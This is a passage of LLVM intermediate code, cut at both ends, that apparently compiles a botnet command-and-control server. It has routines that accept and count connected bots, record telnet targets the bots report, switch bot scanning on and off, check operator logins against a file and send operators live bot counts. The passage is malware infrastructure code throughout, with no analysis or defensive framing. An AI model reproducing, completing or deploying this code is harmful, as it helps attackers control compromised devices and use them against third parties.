  %131 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %130, i32 0, i32 0
  %132 = load i32, i32* %131, align 8
  %133 = load i32, i32* %10, align 4
  %134 = sext i32 %133 to i64
  %135 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %134
  %136 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %135, i32 0, i32 0
  %137 = load i32, i32* %136, align 8
  %138 = icmp eq i32 %132, %137
  br i1 %138, label %139, label %140

139:                                              ; preds = %127
  store i32 1, i32* %12, align 4
  br label %144

140:                                              ; preds = %127
  br label %141

141:                                              ; preds = %140, %126
  %142 = load i32, i32* %11, align 4
  %143 = add nsw i32 %142, 1
  store i32 %143, i32* %11, align 4
  br label %112, !llvm.loop !12

144:                                              ; preds = %139, %112
  %145 = load i32, i32* %12, align 4
  %146 = icmp ne i32 %145, 0
  br i1 %146, label %147, label %157

147:                                              ; preds = %144
  %148 = load i32, i32* %10, align 4
  %149 = call i64 @send(i32 %148, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.7, i64 0, i64 0), i64 13, i32 16384)
  %150 = icmp eq i64 %149, -1
  br i1 %150, label %151, label %154

151:                                              ; preds = %147
  %152 = load i32, i32* %10, align 4
  %153 = call i32 @close(i32 %152)
  br label %88

154:                                              ; preds = %147
  %155 = load i32, i32* %10, align 4
  %156 = call i32 @close(i32 %155)
  br label %88

157:                                              ; preds = %144
  %158 = load i32, i32* %10, align 4
  %159 = call i32 @make_socket_non_blocking(i32 %158)
  store i32 %159, i32* %5, align 4
  %160 = load i32, i32* %5, align 4
  %161 = icmp eq i32 %160, -1
  br i1 %161, label %162, label %165

162:                                              ; preds = %157
  %163 = load i32, i32* %10, align 4
  %164 = call i32 @close(i32 %163)
  br label %185

165:                                              ; preds = %157
  %166 = load i32, i32* %10, align 4
  %167 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %3, i32 0, i32 1
  %168 = bitcast %union.epoll_data* %167 to i32*
  store i32 %166, i32* %168, align 1
  %169 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %3, i32 0, i32 0
  store i32 -2147483647, i32* %169, align 1
  %170 = load volatile i32, i32* @epollFD, align 4
  %171 = load i32, i32* %10, align 4
  %172 = call i32 @epoll_ctl(i32 %170, i32 1, i32 %171, %struct.epoll_event* %3) #9
  store i32 %172, i32* %5, align 4
  %173 = load i32, i32* %5, align 4
  %174 = icmp eq i32 %173, -1
  br i1 %174, label %175, label %178

175:                                              ; preds = %165
  call void @perror(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.8, i64 0, i64 0))
  %176 = load i32, i32* %10, align 4
  %177 = call i32 @close(i32 %176)
  br label %185

178:                                              ; preds = %165
  %179 = load i32, i32* %10, align 4
  %180 = sext i32 %179 to i64
  %181 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %180
  %182 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %181, i32 0, i32 1
  store i8 1, i8* %182, align 4
  %183 = load i32, i32* %10, align 4
  %184 = call i64 @send(i32 %183, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.9, i64 0, i64 0), i64 14, i32 16384)
  br label %88

185:                                              ; preds = %175, %162, %102, %101
  br label %294

186:                                              ; preds = %77
  %187 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %188 = load i32, i32* %7, align 4
  %189 = sext i32 %188 to i64
  %190 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %187, i64 %189
  %191 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %190, i32 0, i32 1
  %192 = bitcast %union.epoll_data* %191 to i32*
  %193 = load i32, i32* %192, align 1
  store i32 %193, i32* %13, align 4
  %194 = load i32, i32* %13, align 4
  %195 = sext i32 %194 to i64
  %196 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %195
  store %struct.clientdata_t* %196, %struct.clientdata_t** %14, align 8
  store i32 0, i32* %15, align 4
  %197 = load %struct.clientdata_t*, %struct.clientdata_t** %14, align 8
  %198 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %197, i32 0, i32 1
  store i8 1, i8* %198, align 4
  br label %199

199:                                              ; preds = %186, %290
  %200 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %200, i8 0, i64 2048, i1 false)
  br label %201

201:                                              ; preds = %265, %264, %257, %249, %233, %227, %199
  %202 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %202, i8 0, i64 2048, i1 false)
  %203 = icmp ne i8* %202, null
  br i1 %203, label %204, label %210

204:                                              ; preds = %201
  %205 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %206 = load i32, i32* %13, align 4
  %207 = call i32 @fdgets(i8* %205, i32 2048, i32 %206)
  %208 = sext i32 %207 to i64
  store i64 %208, i64* %16, align 8
  %209 = icmp sgt i64 %208, 0
  br label %210

210:                                              ; preds = %204, %201
  %211 = phi i1 [ false, %201 ], [ %209, %204 ]
  br i1 %211, label %212, label %268

212:                                              ; preds = %210
  %213 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %214 = call i8* @strstr(i8* %213, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i64 0, i64 0)) #8
  %215 = icmp eq i8* %214, null
  br i1 %215, label %216, label %217

216:                                              ; preds = %212
  store i32 1, i32* %15, align 4
  br label %268

217:                                              ; preds = %212
  %218 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  call void @trim(i8* %218)
  %219 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %220 = call i32 @strcmp(i8* %219, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i64 0, i64 0)) #8
  %221 = icmp eq i32 %220, 0
  br i1 %221, label %222, label %228

222:                                              ; preds = %217
  %223 = load i32, i32* %13, align 4
  %224 = call i64 @send(i32 %223, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.10, i64 0, i64 0), i64 5, i32 16384)
  %225 = icmp eq i64 %224, -1
  br i1 %225, label %226, label %227

226:                                              ; preds = %222
  store i32 1, i32* %15, align 4
  br label %268

227:                                              ; preds = %222
  br label %201, !llvm.loop !13

228:                                              ; preds = %217
  %229 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %230 = call i8* @strstr(i8* %229, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.11, i64 0, i64 0)) #8
  %231 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %232 = icmp eq i8* %230, %231
  br i1 %232, label %233, label %244

233:                                              ; preds = %228
  %234 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %235 = call i8* @strstr(i8* %234, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.11, i64 0, i64 0)) #8
  %236 = getelementptr inbounds i8, i8* %235, i64 7
  store i8* %236, i8** %18, align 8
  %237 = load %struct._IO_FILE*, %struct._IO_FILE** @telFD, align 8
  %238 = load i8*, i8** %18, align 8
  %239 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %237, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.12, i64 0, i64 0), i8* %238)
  %240 = load %struct._IO_FILE*, %struct._IO_FILE** @telFD, align 8
  %241 = call i32 @fflush(%struct._IO_FILE* %240)
  %242 = load volatile i32, i32* @TELFound, align 4
  %243 = add nsw i32 %242, 1
  store volatile i32 %243, i32* @TELFound, align 4
  br label %201, !llvm.loop !13

244:                                              ; preds = %228
  %245 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %246 = call i8* @strstr(i8* %245, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.13, i64 0, i64 0)) #8
  %247 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %248 = icmp eq i8* %246, %247
  br i1 %248, label %249, label %252

249:                                              ; preds = %244
  %250 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %251 = call i8* @strstr(i8* %250, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.13, i64 0, i64 0)) #8
  store i8* %251, i8** %19, align 8
  store volatile i32 1, i32* @scannerreport, align 4
  br label %201, !llvm.loop !13

252:                                              ; preds = %244
  %253 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %254 = call i8* @strstr(i8* %253, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.14, i64 0, i64 0)) #8
  %255 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %256 = icmp eq i8* %254, %255
  br i1 %256, label %257, label %260

257:                                              ; preds = %252
  %258 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %259 = call i8* @strstr(i8* %258, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.14, i64 0, i64 0)) #8
  store i8* %259, i8** %20, align 8
  store volatile i32 0, i32* @scannerreport, align 4
  br label %201, !llvm.loop !13

260:                                              ; preds = %252
  %261 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %262 = call i32 @strcmp(i8* %261, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.15, i64 0, i64 0)) #8
  %263 = icmp eq i32 %262, 0
  br i1 %263, label %264, label %265

264:                                              ; preds = %260
  br label %201, !llvm.loop !13

265:                                              ; preds = %260
  %266 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %267 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.16, i64 0, i64 0), i8* %266)
  br label %201, !llvm.loop !13

268:                                              ; preds = %226, %216, %210
  %269 = load i64, i64* %16, align 8
  %270 = icmp eq i64 %269, -1
  br i1 %270, label %271, label %277

271:                                              ; preds = %268
  %272 = call i32* @__errno_location() #10
  %273 = load i32, i32* %272, align 4
  %274 = icmp ne i32 %273, 11
  br i1 %274, label %275, label %276

275:                                              ; preds = %271
  store i32 1, i32* %15, align 4
  br label %276

276:                                              ; preds = %275, %271
  br label %291

277:                                              ; preds = %268
  %278 = load i64, i64* %16, align 8
  %279 = icmp eq i64 %278, 0
  br i1 %279, label %280, label %281

280:                                              ; preds = %277
  store i32 1, i32* %15, align 4
  br label %291

281:                                              ; preds = %277
  br label %282

282:                                              ; preds = %281
  %283 = load i32, i32* %15, align 4
  %284 = icmp ne i32 %283, 0
  br i1 %284, label %285, label %290

285:                                              ; preds = %282
  %286 = load %struct.clientdata_t*, %struct.clientdata_t** %14, align 8
  %287 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %286, i32 0, i32 1
  store i8 0, i8* %287, align 4
  %288 = load i32, i32* %13, align 4
  %289 = call i32 @close(i32 %288)
  br label %290

290:                                              ; preds = %285, %282
  br label %199

291:                                              ; preds = %280, %276
  br label %292

292:                                              ; preds = %291
  br label %293

293:                                              ; preds = %292
  br label %294

294:                                              ; preds = %293, %185, %58
  %295 = load i32, i32* %7, align 4
  %296 = add nsw i32 %295, 1
  store i32 %296, i32* %7, align 4
  br label %27, !llvm.loop !14

297:                                              ; preds = %27
  br label %23
}

; Function Attrs: nounwind
declare noalias align 16 i8* @calloc(i64, i64) #3

declare i32 @epoll_wait(i32, %struct.epoll_event*, i32, i32) #1

declare i32 @close(i32) #1

declare i32 @accept(i32, %struct.sockaddr*, i32*) #1

; Function Attrs: nounwind readnone willreturn
declare i32* @__errno_location() #5

declare void @perror(i8*) #1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define internal i32 @make_socket_non_blocking(i32 %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  %6 = load i32, i32* %3, align 4
  %7 = call i32 (i32, i32, ...) @fcntl(i32 %6, i32 3, i32 0)
  store i32 %7, i32* %4, align 4
  %8 = load i32, i32* %4, align 4
  %9 = icmp eq i32 %8, -1
  br i1 %9, label %10, label %11

10:                                               ; preds = %1
  call void @perror(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.80, i64 0, i64 0))
  store i32 -1, i32* %2, align 4
  br label %21

11:                                               ; preds = %1
  %12 = load i32, i32* %4, align 4
  %13 = or i32 %12, 2048
  store i32 %13, i32* %4, align 4
  %14 = load i32, i32* %3, align 4
  %15 = load i32, i32* %4, align 4
  %16 = call i32 (i32, i32, ...) @fcntl(i32 %14, i32 4, i32 %15)
  store i32 %16, i32* %5, align 4
  %17 = load i32, i32* %5, align 4
  %18 = icmp eq i32 %17, -1
  br i1 %18, label %19, label %20

19:                                               ; preds = %11
  call void @perror(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.80, i64 0, i64 0))
  store i32 -1, i32* %2, align 4
  br label %21

20:                                               ; preds = %11
  store i32 0, i32* %2, align 4
  br label %21

21:                                               ; preds = %20, %19, %10
  %22 = load i32, i32* %2, align 4
  ret i32 %22
}

; Function Attrs: nounwind
declare i32 @epoll_ctl(i32, i32, i32, %struct.epoll_event*) #3

; Function Attrs: nounwind readonly willreturn
declare i8* @strstr(i8*, i8*) #2

declare i32 @fprintf(%struct._IO_FILE*, i8*, ...) #1

declare i32 @fflush(%struct._IO_FILE*) #1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @BotsConnected() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  store i32 0, i32* %2, align 4
  store i32 0, i32* %1, align 4
  br label %3

3:                                                ; preds = %17, %0
  %4 = load i32, i32* %1, align 4
  %5 = icmp slt i32 %4, 1000000
  br i1 %5, label %6, label %20

6:                                                ; preds = %3
  %7 = load i32, i32* %1, align 4
  %8 = sext i32 %7 to i64
  %9 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %8
  %10 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %9, i32 0, i32 1
  %11 = load i8, i8* %10, align 4
  %12 = icmp ne i8 %11, 0
  br i1 %12, label %14, label %13

13:                                               ; preds = %6
  br label %17

14:                                               ; preds = %6
  %15 = load i32, i32* %2, align 4
  %16 = add nsw i32 %15, 1
  store i32 %16, i32* %2, align 4
  br label %17

17:                                               ; preds = %14, %13
  %18 = load i32, i32* %1, align 4
  %19 = add nsw i32 %18, 1
  store i32 %19, i32* %1, align 4
  br label %3, !llvm.loop !15

20:                                               ; preds = %3
  %21 = load i32, i32* %2, align 4
  ret i32 %21
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i8* @TitleWriter(i8* %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca [2048 x i8], align 16
  store i8* %0, i8** %2, align 8
  %5 = load i8*, i8** %2, align 8
  %6 = ptrtoint i8* %5 to i32
  store i32 %6, i32* %3, align 4
  br label %7

7:                                                ; preds = %1, %20
  %8 = getelementptr inbounds [2048 x i8], [2048 x i8]* %4, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %8, i8 0, i64 2048, i1 false)
  %9 = getelementptr inbounds [2048 x i8], [2048 x i8]* %4, i64 0, i64 0
  %10 = call i32 @BotsConnected()
  %11 = load volatile i32, i32* @OperatorsConnected, align 4
  %12 = call i32 (i8*, i8*, ...) @sprintf(i8* %9, i8* getelementptr inbounds ([53 x i8], [53 x i8]* @.str.17, i64 0, i64 0), i32 27, i32 %10, i32 %11, i32 7) #9
  %13 = load i32, i32* %3, align 4
  %14 = getelementptr inbounds [2048 x i8], [2048 x i8]* %4, i64 0, i64 0
  %15 = getelementptr inbounds [2048 x i8], [2048 x i8]* %4, i64 0, i64 0
  %16 = call i64 @strlen(i8* %15) #8
  %17 = call i64 @send(i32 %13, i8* %14, i64 %16, i32 16384)
  %18 = icmp eq i64 %17, -1
  br i1 %18, label %19, label %20

19:                                               ; preds = %7
  ret i8* null

20:                                               ; preds = %7
  %21 = call i32 @sleep(i32 2)
  br label %7
}

; Function Attrs: nounwind
declare i32 @sprintf(i8*, i8*, ...) #3

declare i32 @sleep(i32) #1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @Find_Login(i8* %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca %struct._IO_FILE*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca [512 x i8], align 16
  store i8* %0, i8** %3, align 8
  store i32 0, i32* %5, align 4
  store i32 0, i32* %6, align 4
  store i32 0, i32* %7, align 4
  %9 = call noalias %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.18, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.19, i64 0, i64 0))
  store %struct._IO_FILE* %9, %struct._IO_FILE** %4, align 8
  %10 = icmp eq %struct._IO_FILE* %9, null
  br i1 %10, label %11, label %12

11:                                               ; preds = %1
  store i32 -1, i32* %2, align 4
  br label %42

12:                                               ; preds = %1
  br label %13

13:                                               ; preds = %27, %12
  %14 = getelementptr inbounds [512 x i8], [512 x i8]* %8, i64 0, i64 0
  %15 = load %struct._IO_FILE*, %struct._IO_FILE** %4, align 8
  %16 = call i8* @fgets(i8* %14, i32 512, %struct._IO_FILE* %15)
  %17 = icmp ne i8* %16, null
  br i1 %17, label %18, label %30

18:                                               ; preds = %13
  %19 = getelementptr inbounds [512 x i8], [512 x i8]* %8, i64 0, i64 0
  %20 = load i8*, i8** %3, align 8
  %21 = call i8* @strstr(i8* %19, i8* %20) #8
  %22 = icmp ne i8* %21, null
  br i1 %22, label %23, label %27

23:                                               ; preds = %18
  %24 = load i32, i32* %6, align 4
  %25 = add nsw i32 %24, 1
  store i32 %25, i32* %6, align 4
  %26 = load i32, i32* %5, align 4
  store i32 %26, i32* %7, align 4
  br label %27

27:                                               ; preds = %23, %18
  %28 = load i32, i32* %5, align 4
  %29 = add nsw i32 %28, 1
  store i32 %29, i32* %5, align 4
  br label %13, !llvm.loop !16

30:                                               ; preds = %13
  %31 = load %struct._IO_FILE*, %struct._IO_FILE** %4, align 8
  %32 = icmp ne %struct._IO_FILE* %31, null
  br i1 %32, label %33, label %36

33:                                               ; preds = %30
  %34 = load %struct._IO_FILE*, %struct._IO_FILE** %4, align 8
  %35 = call i32 @fclose(%struct._IO_FILE* %34)
  br label %36

36:                                               ; preds = %33, %30
  %37 = load i32, i32* %6, align 4
  %38 = icmp eq i32 %37, 0
  br i1 %38, label %39, label %40

39:                                               ; preds = %36
  store i32 0, i32* %2, align 4
  br label %42

40:                                               ; preds = %36
  %41 = load i32, i32* %7, align 4
  store i32 %41, i32* %2, align 4
  br label %42

42:                                               ; preds = %40, %39, %11
  %43 = load i32, i32* %2, align 4
  ret i32 %43
}

declare noalias %struct._IO_FILE* @fopen(i8*, i8*) #1

declare i8* @fgets(i8*, i32, %struct._IO_FILE*) #1

declare i32 @fclose(%struct._IO_FILE*) #1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i8* @BotWorker(i8* %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i64, align 8
  %7 = alloca [2048 x i8], align 16
  %8 = alloca i8*, align 8
  %9 = alloca i8*, align 8
  %10 = alloca [2048 x i8], align 16
  %11 = alloca %struct._IO_FILE*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i8*, align 8
  %16 = alloca [80 x i8], align 16
  %17 = alloca [5000 x i8], align 16
  %18 = alloca [5000 x i8], align 16
  %19 = alloca [5000 x i8], align 16
  %20 = alloca [5000 x i8], align 16
  %21 = alloca [5000 x i8], align 16
  %22 = alloca [5000 x i8], align 16
  %23 = alloca [5000 x i8], align 16
  %24 = alloca [5000 x i8], align 16
  %25 = alloca [5000 x i8], align 16
  %26 = alloca [80 x i8], align 16
  %27 = alloca [2048 x i8], align 16
  %28 = alloca [50 x i8], align 16
  %29 = alloca [50 x i8], align 16
  %30 = alloca [50 x i8], align 16
  %31 = alloca [50 x i8], align 16
  %32 = alloca [50 x i8], align 16
  %33 = alloca [50 x i8], align 16
  %34 = alloca [50 x i8], align 16
  %35 = alloca [50 x i8], align 16
  %36 = alloca [2048 x i8], align 16
  %37 = alloca [2048 x i8], align 16
  %38 = alloca [80 x i8], align 16
  %39 = alloca [80 x i8], align 16
  %40 = alloca [80 x i8], align 16
  %41 = alloca [80 x i8], align 16
  %42 = alloca [80 x i8], align 16
  %43 = alloca [80 x i8], align 16
  %44 = alloca [80 x i8], align 16
  %45 = alloca [80 x i8], align 16
  %46 = alloca [80 x i8], align 16
  %47 = alloca [80 x i8], align 16
  %48 = alloca [80 x i8], align 16
  %49 = alloca [80 x i8], align 16
  %50 = alloca [80 x i8], align 16
  %51 = alloca [80 x i8], align 16
  %52 = alloca [80 x i8], align 16
  %53 = alloca [80 x i8], align 16
  %54 = alloca [80 x i8], align 16
  %55 = alloca [2048 x i8], align 16
  %56 = alloca [2048 x i8], align 16
  %57 = alloca [80 x i8], align 16
  %58 = alloca [2048 x i8], align 16
  %59 = alloca %struct._IO_FILE*, align 8
  %60 = alloca i64, align 8
  %61 = alloca %struct.tm*, align 8
  %62 = alloca [50 x i8], align 16
  %63 = alloca [50 x i8], align 16
  store i8* %0, i8** %3, align 8
  %64 = load i8*, i8** %3, align 8
  %65 = ptrtoint i8* %64 to i32
  store i32 %65, i32* %4, align 4
  %66 = load volatile i32, i32* @OperatorsConnected, align 4
  %67 = add nsw i32 %66, 1
  store volatile i32 %67, i32* @OperatorsConnected, align 4
  %68 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %68, i8 0, i64 2048, i1 false)
  %69 = getelementptr inbounds [2048 x i8], [2048 x i8]* %10, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %69, i8 0, i64 2048, i1 false)
  store i32 0, i32* %12, align 4
  %70 = call noalias %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.18, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.19, i64 0, i64 0))
  store %struct._IO_FILE* %70, %struct._IO_FILE** %11, align 8
  br label %71

71:                                               ; preds = %76, %1
  %72 = load %struct._IO_FILE*, %struct._IO_FILE** %11, align 8
  %73 = call i32 @feof(%struct._IO_FILE* %72) #9
  %74 = icmp ne i32 %73, 0
  %75 = xor i1 %74, true
  br i1 %75, label %76, label %81

76:                                               ; preds = %71
  %77 = load %struct._IO_FILE*, %struct._IO_FILE** %11, align 8
  %78 = call i32 @fgetc(%struct._IO_FILE* %77)
  store i32 %78, i32* %13, align 4
  %79 = load i32, i32* %12, align 4
  %80 = add nsw i32 %79, 1
  store i32 %80, i32* %12, align 4
  br label %71, !llvm.loop !17

81:                                               ; preds = %71
  store i32 0, i32* %14, align 4
  %82 = load %struct._IO_FILE*, %struct._IO_FILE** %11, align 8
  call void @rewind(%struct._IO_FILE* %82)
  br label %83

83:                                               ; preds = %88, %81
  %84 = load i32, i32* %14, align 4
  %85 = load i32, i32* %12, align 4
  %86 = sub nsw i32 %85, 1
  %87 = icmp ne i32 %84, %86
  br i1 %87, label %88, label %103

88:                                               ; preds = %83
  %89 = load %struct._IO_FILE*, %struct._IO_FILE** %11, align 8
  %90 = load i32, i32* %14, align 4
  %91 = sext i32 %90 to i64
  %92 = getelementptr inbounds [2 x %struct.login_info], [2 x %struct.login_info]* @accounts, i64 0, i64 %91
  %93 = getelementptr inbounds %struct.login_info, %struct.login_info* %92, i32 0, i32 0
  %94 = getelementptr inbounds [20 x i8], [20 x i8]* %93, i64 0, i64 0
  %95 = load i32, i32* %14, align 4
  %96 = sext i32 %95 to i64
  %97 = getelementptr inbounds [2 x %struct.login_info], [2 x %struct.login_info]* @accounts, i64 0, i64 %96
  %98 = getelementptr inbounds %struct.login_info, %struct.login_info* %97, i32 0, i32 1
  %99 = getelementptr inbounds [20 x i8], [20 x i8]* %98, i64 0, i64 0
  %100 = call i32 (%struct._IO_FILE*, i8*, ...) @__isoc99_fscanf(%struct._IO_FILE* %89, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.20, i64 0, i64 0), i8* %94, i8* %99)
  %101 = load i32, i32* %14, align 4
  %102 = add nsw i32 %101, 1
  store i32 %102, i32* %14, align 4
  br label %83, !llvm.loop !18

103:                                              ; preds = %83
  %104 = load i32, i32* %4, align 4
  %105 = call i64 @send(i32 %104, i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.21, i64 0, i64 0), i64 22, i32 16384)
  %106 = icmp eq i64 %105, -1
  br i1 %106, label %107, label %108

107:                                              ; preds = %103
  br label %776

108:                                              ; preds = %103
  %109 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %110 = load i32, i32* %4, align 4
  %111 = call i32 @fdgets(i8* %109, i32 2048, i32 %110)
  %112 = icmp slt i32 %111, 1
  br i1 %112, label %113, label %114

113:                                              ; preds = %108
  br label %776

114:                                              ; preds = %108
  %115 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  call void @trim(i8* %115)
  %116 = load i32, i32* %5, align 4
  %117 = sext i32 %116 to i64
  %118 = getelementptr inbounds [2 x %struct.login_info], [2 x %struct.login_info]* @accounts, i64 0, i64 %117
  %119 = getelementptr inbounds %struct.login_info, %struct.login_info* %118, i32 0, i32 0
  %120 = getelementptr inbounds [20 x i8], [20 x i8]* %119, i64 0, i64 0
  %121 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %122 = call i32 (i8*, i8*, ...) @sprintf(i8* %120, i8* %121) #9
  %123 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  store i8* %123, i8** %15, align 8
  %124 = load i8*, i8** %15, align 8
  %125 = call i32 @Find_Login(i8* %124)
  store i32 %125, i32* %5, align 4
  %126 = load i8*, i8** %15, align 8
  %127 = load i32, i32* %5, align 4
  %128 = sext i32 %127 to i64
  %129 = getelementptr inbounds [2 x %struct.login_info], [2 x %struct.login_info]* @accounts, i64 0, i64 %128
  %130 = getelementptr inbounds %struct.login_info, %struct.login_info* %129, i32 0, i32 0
  %131 = getelementptr inbounds [20 x i8], [20 x i8]* %130, i64 0, i64 0
  %132 = call i32 @strcmp(i8* %126, i8* %131) #8
  %133 = icmp eq i32 %132, 0
  br i1 %133, label %134, label %158

134:                                              ; preds = %114
  %135 = load i32, i32* %4, align 4
  %136 = call i64 @send(i32 %135, i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.23, i64 0, i64 0), i64 22, i32 16384)
  %137 = icmp eq i64 %136, -1
  br i1 %137, label %138, label %139

138:                                              ; preds = %134
  br label %776

139:                                              ; preds = %134
  %140 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %141 = load i32, i32* %4, align 4
  %142 = call i32 @fdgets(i8* %140, i32 2048, i32 %141)
  %143 = icmp slt i32 %142, 1
  br i1 %143, label %144, label %145

144:                                              ; preds = %139
  br label %776

145:                                              ; preds = %139
  %146 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  call void @trim(i8* %146)
  %147 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %148 = load i32, i32* %5, align 4
  %149 = sext i32 %148 to i64
  %150 = getelementptr inbounds [2 x %struct.login_info], [2 x %struct.login_info]* @accounts, i64 0, i64 %149
  %151 = getelementptr inbounds %struct.login_info, %struct.login_info* %150, i32 0, i32 1
  %152 = getelementptr inbounds [20 x i8], [20 x i8]* %151, i64 0, i64 0
  %153 = call i32 @strcmp(i8* %147, i8* %152) #8
  %154 = icmp ne i32 %153, 0
  br i1 %154, label %155, label %156

155:                                              ; preds = %145
  br label %159

156:                                              ; preds = %145
  %157 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %157, i8 0, i64 2048, i1 false)
  br label %176

158:                                              ; preds = %114
  br label %159

159:                                              ; preds = %158, %155
  %160 = load i32, i32* %4, align 4
  %161 = call i64 @send(i32 %160, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.24, i64 0, i64 0), i64 5, i32 16384)
  %162 = icmp eq i64 %161, -1
  br i1 %162, label %163, label %164

163:                                              ; preds = %159
  br label %776

164:                                              ; preds = %159
  %165 = getelementptr inbounds [80 x i8], [80 x i8]* %16, i64 0, i64 0
  %166 = call i32 (i8*, i8*, ...) @sprintf(i8* %165, i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.25, i64 0, i64 0)) #9
  %167 = load i32, i32* %4, align 4
  %168 = getelementptr inbounds [80 x i8], [80 x i8]* %16, i64 0, i64 0
  %169 = getelementptr inbounds [80 x i8], [80 x i8]* %16, i64 0, i64 0
  %170 = call i64 @strlen(i8* %169) #8
  %171 = call i64 @send(i32 %167, i8* %168, i64 %170, i32 16384)
